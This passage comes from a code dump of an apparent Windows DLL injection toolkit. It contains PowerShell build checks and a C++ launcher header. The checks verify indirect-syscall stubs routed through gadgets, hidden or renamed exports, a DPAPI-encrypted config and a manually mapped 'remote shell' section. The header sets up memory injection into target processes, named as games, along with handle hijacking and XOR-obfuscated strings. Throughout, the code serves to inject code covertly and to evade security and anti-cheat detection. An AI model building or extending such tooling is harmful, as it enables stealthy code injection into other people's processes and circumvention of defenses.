    exit 1
}

$data = [IO.File]::ReadAllBytes($Path)

if ($Check -eq "Embed") {
    $wordList = @()
    if (-not [string]::IsNullOrWhiteSpace($Words)) { $wordList = $Words -split ',' }
    if ($wordList.Count -ne 8) {
        Write-Fail ("Expected 8 Runtime Hash Words, Got " + $wordList.Count)
        exit 1
    }

    $pos = 0
    $last = $data.Length - 4
    for ($i = 0; $i -lt $wordList.Count; $i++) {
        $w = [string]$wordList[$i]
        if ($w.StartsWith("0x") -or $w.StartsWith("0X")) { $w = $w.Substring(2) }
        $val = [Convert]::ToUInt32($w, 16)
        $b = [BitConverter]::GetBytes([uint32]$val)

        $found = -1
        for ($j = $pos; $j -le $last; $j++) {
            if ($data[$j] -eq $b[0] -and $data[$j + 1] -eq $b[1] -and
                $data[$j + 2] -eq $b[2] -and $data[$j + 3] -eq $b[3]) {
                $found = $j
                break
            }
        }
        if ($found -lt 0) {
            Write-Fail ("Runtime Hash Word " + $i + " Not Found In Order: " + (Get-Painted $script:C_Dim $Path))
            exit 1
        }
        $pos = $found + 4
    }

    Write-Ok ("Embedded Runtime Hash: " + (Get-Painted $script:C_Green "8") + "/" + (Get-Painted $script:C_Green "8") + " Dwords In Order (" + (Get-Painted $script:C_Dim $Path) + ")")
    exit 0
}

if ($Check -eq "PayloadHash") {
    if ([string]::IsNullOrEmpty($Config)) {
        Write-Fail "Expected A Master Config Path"
        exit 1
    }
    if (-not (Test-Path -LiteralPath $Config)) {
        Write-Fail ("Master Config Not Found: " + (Get-Painted $script:C_Dim $Config))
        exit 1
    }

    $pin = $null
    foreach ($line in [IO.File]::ReadAllLines($Config)) {
        $trimmed = $line.Trim()
        if ($trimmed.Length -eq 0 -or $trimmed.StartsWith(";") -or $trimmed.StartsWith("#")) { continue }
        $eq = $trimmed.IndexOf("=")
        if ($eq -lt 1) { continue }
        if ($trimmed.Substring(0, $eq).Trim() -ieq "PayloadSha256") {
            $pin = $trimmed.Substring($eq + 1).Trim()
            break
        }
    }
    if ([string]::IsNullOrEmpty($pin)) {
        Write-Fail ("PayloadSha256 Pin Missing In " + (Get-Painted $script:C_Dim $Config))
        exit 1
    }

    $actual = ([BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash($data)) -replace "-", "")
    if ($actual -ine $pin) {
        Write-Fail ("Payload Hash Mismatch: Expected " + $pin + ", Got " + $actual + " (" + (Get-Painted $script:C_Dim $Path) + ")")
        exit 1
    }
    Write-Ok ("Payload SHA-256 = " + (Get-Painted $script:C_Green $actual) + " (" + (Get-Painted $script:C_Dim $Path) + ")")
    exit 0
}

if ($Check -eq "DeployedPin") {
    if ([string]::IsNullOrEmpty($ExpectPin)) {
        Write-Fail "Expected A Payload SHA-256"
        exit 1
    }
    if ([string]::IsNullOrEmpty($Magic)) {
        Write-Fail "Expected A Config Magic"
        exit 1
    }

    $magicBytes = [Text.Encoding]::ASCII.GetBytes($Magic)
    $isEncrypted = $false
    if ($data.Length -gt $magicBytes.Length) {
        $isEncrypted = $true
        for ($i = 0; $i -lt $magicBytes.Length; $i++) {
            if ($data[$i] -ne $magicBytes[$i]) { $isEncrypted = $false; break }
        }
    }
    if ($isEncrypted) {
        Add-Type -AssemblyName System.Security | Out-Null
        try {
            $blob = New-Object byte[] ($data.Length - $magicBytes.Length)
            [Array]::Copy($data, $magicBytes.Length, $blob, 0, $blob.Length)
            $plainBytes = [Security.Cryptography.ProtectedData]::Unprotect($blob, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
        } catch {
            Write-Fail ("DPAPI Decrypt Failed: " + $_.Exception.Message)
            exit 1
        }
        $text = [Text.Encoding]::UTF8.GetString($plainBytes)
    } else {
        $text = [Text.Encoding]::UTF8.GetString($data)
    }

    $pin = $null
    foreach ($line in ($text -split "\r?\n")) {
        $trimmed = $line.Trim()
        if ($trimmed.Length -eq 0 -or $trimmed.StartsWith(";") -or $trimmed.StartsWith("#")) { continue }
        $eq = $trimmed.IndexOf("=")
        if ($eq -lt 1) { continue }
        if ($trimmed.Substring(0, $eq).Trim() -ieq "PayloadSha256") {
            $pin = $trimmed.Substring($eq + 1).Trim()
            break
        }
    }
    if ([string]::IsNullOrEmpty($pin)) {
        Write-Fail ("Deployed Config Pins No PayloadSha256 (" + (Get-Painted $script:C_Dim $Path) + ")")
        exit 1
    }
    if ($pin -ine $ExpectPin) {
        Write-Fail ("Deployed Config Pin Mismatch: Config Pins " + $pin + ", Deployed Payload Is " + $ExpectPin + " (" + (Get-Painted $script:C_Dim $Path) + ")")
        exit 1
    }
    Write-Ok ("Deployed Config Pin = " + (Get-Painted $script:C_Green $pin) + " (" + (Get-Painted $script:C_Dim $Path) + ")")
    exit 0
}

if ($Check -eq "ConfigKeys") {
    if ([string]::IsNullOrEmpty($Magic)) {
        Write-Fail "Expected A Config Magic"
        exit 1
    }

    $magicBytes = [Text.Encoding]::ASCII.GetBytes($Magic)
    $isEncrypted = $false
    if ($data.Length -gt $magicBytes.Length) {
        $isEncrypted = $true
        for ($i = 0; $i -lt $magicBytes.Length; $i++) {
            if ($data[$i] -ne $magicBytes[$i]) { $isEncrypted = $false; break }
        }
    }
    if ($isEncrypted) {
        Add-Type -AssemblyName System.Security | Out-Null
        try {
            $blob = New-Object byte[] ($data.Length - $magicBytes.Length)
            [Array]::Copy($data, $magicBytes.Length, $blob, 0, $blob.Length)
            $plainBytes = [Security.Cryptography.ProtectedData]::Unprotect($blob, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
        } catch {
            Write-Fail ("DPAPI Decrypt Failed: " + $_.Exception.Message)
            exit 1
        }
        $text = [Text.Encoding]::UTF8.GetString($plainBytes)
    } else {
        $text = [Text.Encoding]::UTF8.GetString($data)
    }

    $present = @{}
    foreach ($line in ($text -split "\r?\n")) {
        $trimmed = $line.Trim()
        if ($trimmed.Length -eq 0 -or $trimmed.StartsWith(";") -or $trimmed.StartsWith("#")) { continue }
        $eq = $trimmed.IndexOf("=")
        if ($eq -lt 1) { continue }
        $k = $trimmed.Substring(0, $eq).Trim()
        $v = $trimmed.Substring($eq + 1).Trim()
        if ($k -ieq "PayloadName" -or $k -ieq "RuntimeName" -or $k -ieq "ExportMap" -or $k -ieq "DllDir") { $present[$k] = $v }
    }
    foreach ($k in @("PayloadName", "RuntimeName", "ExportMap", "DllDir")) {
        if (-not $present.ContainsKey($k) -or [string]::IsNullOrEmpty($present[$k])) {
            Write-Fail ("Deployed Config Is Missing Required Key: " + $k + " (" + (Get-Painted $script:C_Dim $Path) + ")")
            exit 1
        }
    }
    Write-Ok ("Deployed Config Carries Per-Build Keys: PayloadName, RuntimeName, ExportMap, DllDir (" + (Get-Painted $script:C_Dim $Path) + ")")
    exit 0
}

if ([string]::IsNullOrEmpty($Magic)) {
    Write-Fail "Expected A Config Magic String"
    exit 1
}
$expected = [Text.Encoding]::ASCII.GetBytes($Magic)
if ($data.Length -lt $expected.Length) {
    Write-Fail ("Encrypted Config Magic '" + $Magic + "' Missing: " + (Get-Painted $script:C_Dim $Path))
    exit 1
}
for ($i = 0; $i -lt $expected.Length; $i++) {
    if ($data[$i] -ne $expected[$i]) {
        Write-Fail ("Encrypted Config Magic '" + $Magic + "' Missing: " + (Get-Painted $script:C_Dim $Path))
        exit 1
    }
}
Write-Ok ("Encrypted Config Magic = " + (Get-Painted $script:C_Green $Magic) + " (" + (Get-Painted $script:C_Dim $Path) + ")")
exit 0

```

### Build/Scripts/VerifyExportsName.ps1 â€” 61 lines â€” sha12:79E8E00AFC19
```powershell
param(
    [Parameter(Mandatory = $true)][string]$Path
)
$ErrorActionPreference = "Stop"
if (-not (Test-Path -LiteralPath $Path)) { Write-Host "MISSING"; exit 1 }
$bytes = [IO.File]::ReadAllBytes($Path)
$e = [BitConverter]::ToInt32($bytes, 0x3C)
$magic = [BitConverter]::ToUInt16($bytes, $e + 24)
$optOff = $e + 24
$numSections = [BitConverter]::ToUInt16($bytes, $e + 6)
$secOff = $e + 24 + (0xF0, 0xE0)[$magic -ne 0x20B]
function RvaToOff($rva) {
    for ($i = 0; $i -lt $numSections; $i++) {
        $o = $secOff + $i * 40
        $va = [BitConverter]::ToUInt32($bytes, $o + 12)
        $vs = [BitConverter]::ToUInt32($bytes, $o + 8)
        $rp = [BitConverter]::ToUInt32($bytes, $o + 20)
        if ($rva -ge $va -and $rva -lt ($va + $vs)) { return $rp + ($rva - $va) }
    }
    return $null
}
$exportRva = [BitConverter]::ToUInt32($bytes, $optOff + 0x70)
$exportSize = [BitConverter]::ToUInt32($bytes, $optOff + 0x74)

# A module with no export directory at all (for example the manual-mapped payload) is the
# strongest possible outcome: there are no names to leak. Say so instead of faulting.
if ($exportRva -eq 0 -or $exportSize -eq 0) {
    Write-Host "OK: no export directory present (0 named exports)"
    exit 0
}

$off = RvaToOff $exportRva
if ($null -eq $off) {
    Write-Host "FAIL: export directory RVA 0x$($exportRva.ToString('X')) is outside every section"
    exit 1
}
$numNames = [BitConverter]::ToUInt32($bytes, $off + 24)
$namesRva = [BitConverter]::ToUInt32($bytes, $off + 32)
$namesOff = RvaToOff $namesRva
if ($numNames -gt 0 -and $null -eq $namesOff) {
    Write-Host "FAIL: export name table RVA 0x$($namesRva.ToString('X')) is outside every section"
    exit 1
}
$bad = @("CoreExecute","CoreStart","CoreStop","CoreFetch","CoreSetTrace","CoreLastError","CoreClearLastError","CoreExecStats","CoreSymbolState","CoreImportState","CoreAcqStats","CoreLoadStats","CoreExecTelemetry","CoreStrStats")
$found = @()
for ($i = 0; $i -lt $numNames; $i++) {
    $nrva = [BitConverter]::ToUInt32($bytes, $namesOff + $i * 4)
    $noff = RvaToOff $nrva
    if ($null -eq $noff) {
        Write-Host "FAIL: export name RVA 0x$($nrva.ToString('X')) is outside every section"
        exit 1
    }
    $end = $noff
    while ($end -lt $bytes.Length -and $bytes[$end] -ne 0) { $end++ }
    $name = [Text.Encoding]::ASCII.GetString($bytes, $noff, $end - $noff)
    if ($bad -contains $name) { $found += $name }
}
if ($found.Count -gt 0) {
    Write-Host "FAIL: stable export names present: $($found -join ', ')"
    exit 1
}
Write-Host "OK: $numNames exports, no stable Core* names"
exit 0
```

### Build/Scripts/VerifySyscallsLayer.ps1 â€” 191 lines â€” sha12:5C1EC6B8E301
```powershell
param(
    [Parameter(Mandatory = $true)]
    [ValidateSet("Stub", "Payload", "Stealth", "MmapSections")]
    [string]$Check,

    [Parameter(Mandatory = $true)]
    [string]$Path
)

$ErrorActionPreference = "Stop"

$script:UseColor = -not [Console]::IsOutputRedirected
$script:Esc = [char]27
$script:C_Green = "$($script:Esc)[92m"
$script:C_Red = "$($script:Esc)[91m"
$script:C_Dim = "$($script:Esc)[90m"
$script:C_Reset = "$($script:Esc)[0m"

function Get-Painted([string]$Color, [string]$Text) {
    if (-not $script:UseColor) { return $Text }
    return ($Color + $Text + $script:C_Reset)
}

function Write-Ok([string]$Text) {
    Write-Host ("  " + (Get-Painted $script:C_Green "OK") + " " + $Text)
}

function Write-Fail([string]$Text) {
    Write-Host ("  " + (Get-Painted $script:C_Red "[x]") + " " + $Text)
}





function Get-ByteMatches([byte[]]$Hay, [int[]]$Needle) {
    $count = 0
    $last = $Hay.Length - $Needle.Length
    for ($i = 0; $i -le $last; $i++) {
        $ok = $true
        for ($j = 0; $j -lt $Needle.Length; $j++) {
            if ($Needle[$j] -ge 0 -and $Hay[$i + $j] -ne $Needle[$j]) { $ok = $false; break }
        }
        if ($ok) { $count++ }
    }
    return $count
}

if (-not (Test-Path -LiteralPath $Path)) {
    Write-Fail ("Not Found: " + $Path)
    exit 1
}

$data = [IO.File]::ReadAllBytes($Path)






# The emitted stub is not one fixed byte pattern. WriteStub() selects between two
# "mov r10, rcx" encodings and writes either a direct (0F 05 C3) or indirect
# (FF 25 <disp32>) tail. The compiler also materialises the prologue bytes as immediate
# stores rather than a contiguous run, so this checks each piece independently instead of
# requiring one template.
$prologueA = [int[]](0x4C, 0x8B, 0xD1)
$prologueB = [int[]](0x49, 0x89, 0xCA)
$tailIndirect = [int[]](0xFF, 0x25)
$movEaxImm32 = [int[]](0xB8)

$healthyPrologue = [int[]](0x4C, 0x8B, 0xD1, 0xB8)






$keystreamConstant = [int[]](0x15, 0x7C, 0x4A, 0x7F, 0xB9, 0x79, 0x37, 0x9E)
$keystreamAlt      = [int[]](0xB9, 0xE5, 0xE4, 0x1C, 0x6D, 0x47, 0x58, 0xBF)
$keystreamAlt2     = [int[]](0xEB, 0x11, 0x31, 0x13, 0xBB, 0x49, 0xD0, 0x94)

if ($Check -eq "Stub") {
    $pA = Get-ByteMatches $data $prologueA
    $pB = Get-ByteMatches $data $prologueB
    if ($pA -lt 1 -or $pB -lt 1) {
        Write-Fail "Syscall Stub Prologue Encoding Missing (mov r10,rcx A=$pA B=$pB)"
        exit 1
    }
    Write-Ok ("Syscall Stub Prologues Present (A=$pA B=$pB)")

    $tI = Get-ByteMatches $data $tailIndirect
    if ($tI -lt 1) {
        Write-Fail "Syscall Stub Indirect Tail (FF 25) Missing; The Pool Is Not Using Gadget Indirection"
        exit 1
    }
    Write-Ok ("Syscall Stub Indirect Tail Present ($tI Match)")

    $movE = Get-ByteMatches $data $movEaxImm32
    if ($movE -lt 1) {
        Write-Fail "mov eax, imm32 Opcode (B8) Missing; The SSN Load Would Be Inert"
        exit 1
    }
    Write-Ok ("Syscall SSN Load Opcode Present ($movE Match)")

    $prologueCount = Get-ByteMatches $data $healthyPrologue
    if ($prologueCount -lt 1) {
        Write-Fail "ntdll Healthy-Prologue Comparison Constant Not Present"
        exit 1
    }
    Write-Ok ("Resolver Prologue Constant Present (" + $prologueCount + " Match)")

    $syscallOp = [int[]](0x0F, 0x05)
    $opCount = Get-ByteMatches $data $syscallOp
    Write-Ok ("Syscall Opcode Resolver Probe Present (" + $opCount + " Match)")
}

if ($Check -eq "Payload") {

    # A6 removed the raw-payload transfer: the host maps the finished image at
    # its final address and no keystream is ever mixed. These constants are the
    # old transfer encoder; finding one means the superseded path is still
    # compiled into the runtime.
    $k1 = Get-ByteMatches $data $keystreamConstant
    $k2 = Get-ByteMatches $data $keystreamAlt
    $k3 = Get-ByteMatches $data $keystreamAlt2
    if (($k1 + $k2 + $k3) -gt 0) {
        Write-Fail "Legacy Payload Keystream Constants Still Present; The Raw-Payload Transfer Path Was Not Removed (K1 = $k1 | K2 = $k2 | K3 = $k3)"
        exit 1
    }
    Write-Ok "Raw-Payload Transfer Path Removed (Keystream Constants Absent)"

    # Positive attestation for the split: the host-map log marker, the per-stage
    # timing marker, and the completion-event marker all live in the new code.
    $hostMapNeedle = [int[]][Text.Encoding]::ASCII.GetBytes("Host Map: Image Mapped")
    $stageNeedle = [int[]][Text.Encoding]::ASCII.GetBytes("Shell Stages:")
    $eventNeedle = [int[]][Text.Encoding]::ASCII.GetBytes("Completion Event")
    $hostMap = Get-ByteMatches $data $hostMapNeedle
    $stages = Get-ByteMatches $data $stageNeedle
    $events = Get-ByteMatches $data $eventNeedle
    if (($hostMap -lt 1) -or ($stages -lt 1) -or ($events -lt 1)) {
        Write-Fail ("A6 Host-Mapped Shell Markers Missing (HostMap = " + $hostMap + " | Stages = " + $stages + " | Completion = " + $events + ")")
        exit 1
    }
    Write-Ok ("A6 Host-Mapped Shell Present (HostMap = " + $hostMap + " | Stages = " + $stages + " | Completion = " + $events + ")")
}

if ($Check -eq "Stealth") {






    $shadow = [int[]](0x48, 0x89, 0x4C, 0x24, 0x20)
    $r9rx   = [int[]](0x41, 0xB9, 0x20, 0x00, 0x00, 0x00)
    $r9na   = [int[]](0x41, 0xB9, 0x01, 0x00, 0x00, 0x00)
    $r9rwx  = [int[]](0x41, 0xB9, 0x40, 0x00, 0x00, 0x00)

    $rx  = (Get-ByteMatches $data ([int[]]($shadow + $r9rx)))  + (Get-ByteMatches $data ([int[]]($r9rx + $shadow)))
    $na  = (Get-ByteMatches $data ([int[]]($shadow + $r9na)))  + (Get-ByteMatches $data ([int[]]($r9na + $shadow)))
    $rwx = (Get-ByteMatches $data ([int[]]($shadow + $r9rwx))) + (Get-ByteMatches $data ([int[]]($r9rwx + $shadow)))

    if (($rx -lt 1) -or ($na -lt 1)) {
        Write-Fail "W^X Protection Sequences Missing (PAGE_EXECUTE_READ / PAGE_NOACCESS Into NtProtectVirtualMemory)"
        exit 1
    }
    if ($rwx -gt 0) {
        Write-Host ("  [*] W^X Static Heuristic: " + $rwx + " Adjacent mov r9d,0x40 Sequence(s); Source Review Confirms No PAGE_EXECUTE_READWRITE Protect Request. Live Verifier Is Authoritative.")
    }
    Write-Ok ("W^X Protect Sequences Present (RX = " + $rx + " | NOACCESS = " + $na + " | RWX = " + $rwx + ")")

    Write-Host ("  " + (Get-Painted $script:C_Dim "Static Verification Only; Live Properties Are Checked By The Runtime Verify Tool"))
}

if ($Check -eq "MmapSections") {










    if ($data.Length -lt 64 -or $data[0] -ne 0x4D -or $data[1] -ne 0x5A) {
        Write-Fail "Not An MZ Image"
        exit 1
    }

    $e = [BitConverter]::ToInt32($data, 0x3C)
    if ($e -le 0 -or ($e + 24) -gt $data.Length) { Write-Fail "Bad e_lfanew"; exit 1 }
    if ([BitConverter]::ToUInt32($data, $e) -ne 0x00004550) { Write-Fail "Not PE"; exit 1 }

    $coff = $e + 4
    $nsec = [BitConverter]::ToUInt16($data, $coff + 2)
    $optSize = [BitConverter]::ToUInt16($data, $coff + 16)
    $opt = $e + 24
    if ($nsec -le 0 -or $nsec -gt 96) { Write-Fail "Bad Section Count"; exit 1 }
    if ([BitConverter]::ToUInt16($data, $opt) -ne 0x20B) { Write-Fail "Not PE32+"; exit 1 }

    $secBase = $opt + $optSize
    $names = New-Object System.Collections.ArrayList
    $chars = New-Object System.Collections.ArrayList
    for ($i = 0; $i -lt $nsec; $i++) {
        $o = $secBase + (40 * $i)
        $name = ""
        for ($k = 0; $k -lt 8; $k++) {
            $c = $data[$o + $k]
            if ($c -eq 0) { break }
            $name += [char]$c
        }
        [void]$names.Add($name)
        [void]$chars.Add([PSCustomObject]@{ Index = $i; Name = $name; Offset = $o })
    }





    # ".code" is five characters, so the linker emits it verbatim in the 8-byte section-name
    # field. A section literally named ".code$xx" means the per-part code_seg attributes failed
    # to merge.
    $mmapExact = @($chars | Where-Object { $_.Name -eq ".code" })

    $dollarParts = @($chars | Where-Object { $_.Name -match "\`$" })

    if ($mmapExact.Count -eq 0) {
        Write-Fail "No .code Section Present At All; The Remote Shell Was Not Emitted"
        Write-Host ("      Sections: " + ($names -join ", "))
        exit 1
    }

    $mergedCount = $mmapExact.Count
    if ($mergedCount -ne 1) {
        Write-Fail ("Expected Exactly One Merged .code Section, Found " + $mergedCount)
        exit 1
    }

    if ($dollarParts.Count -ne 0) {
        Write-Fail ("Per-Part code_seg Sections With A `$ Discriminator Survived The Link (" + $dollarParts.Count + ")")
        Write-Host ("      Found: " + (($dollarParts | ForEach-Object { $_.Name }) -join ", "))
        exit 1
    }

    Write-Ok ("Remote Mapping Shell Is A Single Merged Section (" + $mmapExact[0].Name + ")")



    $entry = $mmapExact[0]
    $characteristics = [BitConverter]::ToUInt32($data, $entry.Offset + 36)
    if (($characteristics -band 0x20000000) -eq 0) {
        Write-Fail "Merged .code Section Is Not Executable"
        exit 1
    }
    if (($characteristics -band 0x80000000) -ne 0) {
        Write-Fail "Merged .code Section Is Writable; W^X Regression In The Staged Image"
        exit 1
    }
    Write-Ok ("Merged Shell Section Is Execute+Read (Characteristics 0x" + $characteristics.ToString("X8") + ")")
}

exit 0

```

### Interface/Source/Launcher.h â€” 420 lines â€” sha12:ACBE655867DA
```c-header
#pragma once

// Shared declarations for the launcher.
//
// The launcher is split across several translation units. Everything that more
// than one of them needs lives here; everything else stays local to the unit
// that owns it.

#include "PCH.h"

#include <cstdarg>
#include <cstdio>

#include "../../Ameger/Injection.h"
#include "../../Ameger/Core/Foundation/Error.h"
#include "../../Ameger/Core/Foundation/Primitives/ResourceGuard.h"
#include "../../Ameger/Core/Foundation/Primitives/KcStrings/Core/XorString.h"
#include "../../Ameger/Core/Utility/Binary/PEImage.h"
#include "../../Ameger/NT/NTDefinitions.h"

// The launcher decrypts the deployed configuration with DPAPI and hashes the
// runtime image with CNG, so both import libraries are linked from here.
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "crypt32.lib")
#ifndef RECA_DEFINED
#define RECA_DEFINED
#define ReCa reinterpret_cast
#endif

#pragma region console colours

// The console tints are real ANSI sequences. They are only ever written to a
// real console (UiLog checks the console mode before it prints), and the
// on-disk transcript is written with the escapes stripped. When the host
// console cannot render VT sequences, UiLog strips them from the stream too,
// so a redirected or legacy console never shows escape bytes.
inline constexpr wchar_t kReset[] = L"\x1b[0m";
inline constexpr wchar_t kGreen[] = L"\x1b[92m";
inline constexpr wchar_t kRed[] = L"\x1b[91m";
inline constexpr wchar_t kYellow[] = L"\x1b[93m";
inline constexpr wchar_t kDim[] = L"\x1b[90m";
inline constexpr wchar_t kCyan[] = L"\x1b[96m";

#pragma endregion

#pragma region console output

int UiLog(int indent, const wchar_t * format, ...);

#undef LOG
#define LOG UiLog

// The result log keeps a rolling transcript of everything the launcher printed,
// so a run that ended badly can still be inspected afterwards. The transcript
// is written as the run goes rather than assembled at the end, so the record
// exists even when the process does not reach its own exit path.
namespace ameger_ui_log
{
    void AppendStripped(const wchar_t * text);
    void AppendClean(const wchar_t * text);
    std::wstring ResultLogPath();
    void ResetResultLog();
    bool BeginResultLog(const wchar_t * header);
    void FlushResultLog();
    void WriteResultLog();
    void DiscardResultLog();
    void Clear();
}

// The name of the transcript file next to the launcher. It is derived from the
// launcher name so a renamed build does not overwrite an older transcript.
inline std::wstring g_ResultLogName;

#pragma endregion

#pragma region shared types

enum class Architecture
{
    Unknown,
    X86,
    X64
};

struct MemoryInjectionData
{
    BYTE * RawData;
    DWORD RawSize;
    DWORD ProcessID;
    DWORD Flags;
    DWORD Timeout;
    ULONG_PTR hHandleValue;
    HINSTANCE hDllOut;
    bool GenerateErrorLog;
    DWORD TargetTid;
    ULONG_PTR hThreadHandleValue;
    const wchar_t * DllPath;
};

static_assert(sizeof(MemoryInjectionData) == sizeof(MEMORY_INJECTIONDATA),
    "MemoryInjectionData must match the runtime's MEMORY_INJECTIONDATA layout");

static_assert(offsetof(MemoryInjectionData, RawData) == offsetof(MEMORY_INJECTIONDATA, RawData),
    "MemoryInjectionData::RawData offset must match MEMORY_INJECTIONDATA::RawData");
static_assert(offsetof(MemoryInjectionData, RawSize) == offsetof(MEMORY_INJECTIONDATA, RawSize),
    "MemoryInjectionData::RawSize offset must match MEMORY_INJECTIONDATA::RawSize");
static_assert(offsetof(MemoryInjectionData, ProcessID) == offsetof(MEMORY_INJECTIONDATA, ProcessID),
    "MemoryInjectionData::ProcessID offset must match MEMORY_INJECTIONDATA::ProcessID");
static_assert(offsetof(MemoryInjectionData, Flags) == offsetof(MEMORY_INJECTIONDATA, Flags),
    "MemoryInjectionData::Flags offset must match MEMORY_INJECTIONDATA::Flags");
static_assert(offsetof(MemoryInjectionData, Timeout) == offsetof(MEMORY_INJECTIONDATA, Timeout),
    "MemoryInjectionData::Timeout offset must match MEMORY_INJECTIONDATA::Timeout");
static_assert(offsetof(MemoryInjectionData, hHandleValue) == offsetof(MEMORY_INJECTIONDATA, hHandleValue),
    "MemoryInjectionData::hHandleValue offset must match MEMORY_INJECTIONDATA::hHandleValue");
static_assert(offsetof(MemoryInjectionData, hDllOut) == offsetof(MEMORY_INJECTIONDATA, hDllOut),
    "MemoryInjectionData::hDllOut offset must match MEMORY_INJECTIONDATA::hDllOut");
static_assert(offsetof(MemoryInjectionData, GenerateErrorLog) == offsetof(MEMORY_INJECTIONDATA, GenerateErrorLog),
    "MemoryInjectionData::GenerateErrorLog offset must match MEMORY_INJECTIONDATA::GenerateErrorLog");
static_assert(offsetof(MemoryInjectionData, TargetTid) == offsetof(MEMORY_INJECTIONDATA, TargetTid),
    "MemoryInjectionData::TargetTid offset must match MEMORY_INJECTIONDATA::TargetTid");
static_assert(offsetof(MemoryInjectionData, hThreadHandleValue) == offsetof(MEMORY_INJECTIONDATA, hThreadHandleValue),
    "MemoryInjectionData::hThreadHandleValue offset must match MEMORY_INJECTIONDATA::hThreadHandleValue");
static_assert(offsetof(MemoryInjectionData, DllPath) == offsetof(MEMORY_INJECTIONDATA, DllPath),
    "MemoryInjectionData::DllPath offset must match MEMORY_INJECTIONDATA::DllPath");

struct Runtime
{
    HMODULE module = nullptr;
    f_Memory_Inject memory_inject = nullptr;
    f_GetSymbolState get_symbol_state = nullptr;
    f_GetImportState get_import_state = nullptr;
    f_InitializeRuntime initialize_runtime = nullptr;
    f_ShutdownRuntime shutdown_runtime = nullptr;
    f_StartDownload start_download = nullptr;
    f_SetRawPrintCallback set_raw_print_callback = nullptr;
    f_GetLastHijackStats get_last_hijack_stats = nullptr;
    f_GetLastMapStats get_last_map_stats = nullptr;
    f_GetLastStringStats get_last_string_stats = nullptr;
    f_GetLastThreadExecStats get_last_thread_exec_stats = nullptr;
    f_GetLastExecTelemetry get_last_exec_telemetry = nullptr;
    f_GetRuntimeAbiVersion get_runtime_abi_version = nullptr;
    f_GetLastErrorInfo get_last_error_info = nullptr;
    f_ClearLastErrorInfo clear_last_error_info = nullptr;
};

struct FileInformation
{
    Architecture architecture = Architecture::Unknown;
    bool dotnet = false;
};

// Everything that pins one running process down to one specific instance.
// A name is not an identity: a game can exit and be relaunched between the
// moment the operator confirms it and the moment the payload is written.
//
// The loader list is a three-way answer. A process that has one can be
// mapped into; a process whose PEB reports no list at all has not been set
// up by the loader and cannot; and a process whose PEB cannot be read might
// be either, so it is left for the direct write probe to decide rather than
// being written off.
enum class LoaderListState
{
    Unknown,
    Published,
    NotPublished
};

struct ProcessIdentity
{
    DWORD pid = 0;
    std::wstring name;        // leaf name
    std::wstring full_path;   // full image path
    ULONGLONG creation_time = 0;  // FILETIME, as a 64-bit value
    Architecture architecture = Architecture::Unknown;
    LoaderListState loader_list_state = LoaderListState::Unknown;

    // A process is only ruled out when the loader list is known to be absent.
    bool LoaderListAvailable() const
    {
        return loader_list_state != LoaderListState::NotPublished;
    }

    bool Matches(const ProcessIdentity & other) const
    {
        if (!pid || !other.pid || pid != other.pid)
        {
            return false;
        }
        if (creation_time && other.creation_time && creation_time != other.creation_time)
        {
            return false;
        }
        if (!full_path.empty() && !other.full_path.empty() &&
            _wcsicmp(full_path.c_str(), other.full_path.c_str()) != 0)
        {
            return false;
        }
        return true;
    }
};

struct TargetSelection
{
    DWORD pid = 0;
    std::wstring requested_name;
    std::wstring name;
    Architecture architecture = Architecture::Unknown;
    bool by_name = false;
    // The identity of the process the operator actually confirmed. The
    // launcher re-resolves a name-based target before the load, and without
    // this the confirmation would apply to a different process than the one
    // that ends up being written to.
    ProcessIdentity identity;
};

struct ExportNameMap
{
    std::string old_name;
    std::string new_name;
};

struct WizardConfig
{
    int schema_version = 0;
    bool handle_hijacking = true;
    bool hijack_scan = true;
    bool sponsor_roundtrip = true;
    bool verbose_trace = true;

    bool quiet = false;

    bool detach_console = false;
    bool test_mode = false;
    bool run_dllmain = true;
    bool page_protections = true;
    bool loader_lock = true;
    bool exceptions = true;
    bool resolve_imports = true;
    bool security_cookie = true;
    bool delay_imports = true;
    bool clean_data = true;
    bool execute_tls = true;
    int timeout = 60000;

    // The launcher always runs elevated, and an elevated process is started
    // with a fresh environment rather than the one its parent had. Every
    // tuning knob therefore lives in the configuration file, which is read
    // after the elevation, and not in an environment variable.
    //
    // The transcript of a run is always written. Removing it is something
    // that has to be asked for, and it is only ever asked for after a
    // successful run.
    // The transcript of a run is always written while the run is going, so a
    // crash still leaves its record. Whether a *successful* run's transcript
    // is kept afterwards is the operator's call, and the standing choice is
    // to keep it: the record of a successful load is the one worth having.
    // Removing it has to be asked for explicitly in the configuration; a
    // failed or cancelled run always keeps its transcript regardless.
    bool discard_result_log_on_success = false;
    // Whether the "begin load?" confirmation is answered for the operator.
    // It lives here rather than in an environment variable because the
    // launcher runs elevated, and an elevated process does not inherit its
    // parent's environment.
    bool auto_confirm = false;
    size_t survey_max_regions = 0;
    size_t survey_max_mb = 0;
    size_t survey_max_sample_regions = 0;
    std::wstring donor_owner_blocklist;
    // The image the test run points at. It defaults to notepad, which is
    // harmless and always present.
    std::wstring test_target = L"notepad.exe";

    std::wstring target_name;
    std::wstring expected_payload_sha256;

    std::wstring payload_name;
    std::wstring runtime_name;
    std::vector<ExportNameMap> export_map;

    std::wstring dll_dir = L"DLLs";
};

// Everything the launcher learned about the donor handles of the last attempt.
struct HijackContext
{
    DWORD TargetPid = 0;
    std::wstring TargetName;
    bool SponsorThreadAttempted = false;
    bool SponsorThreadOpened = false;
    ULONG_PTR SponsorThreadValue = 0;
    DWORD SponsorTid = 0;

    DWORD UsedTid = 0;
    bool Verbose = true;
};

#pragma endregion

#pragma region stage formatting

inline std::wstring StageLabel(const wchar_t * label, size_t width = 20)
{
    std::wstring text(label ? label : L"");
    while (text.size() < width)
    {
        text += L'.';
    }
    return text;
}

inline std::wstring StageField(const wchar_t * label, size_t width = 20)
{
    return StageLabel(label, width) + L" ";
}

inline std::wstring StageField(const std::wstring & label, size_t width = 20)
{
    return StageLabel(label.c_str(), width) + L" ";
}

inline std::wstring StageTag(int stage)
{
    wchar_t num[16]{ 0 };
    swprintf_s(num, L"%d", stage);
    return std::wstring(L"[") + kGreen + num + kReset + L"]";
}

#pragma endregion

// The number of encrypted-string markers the build plants in the runtime DLL.
// The verification suite counts how many of them survived into the mapped image
// and asserts the count against this value, so the two must move together.
constexpr size_t kStringMarkerCount = 31;
#pragma region shared helpers

// Whether the launcher should print the runtime's own trace output. The runtime
// asks for it through a callback, so the decision is made in one place.
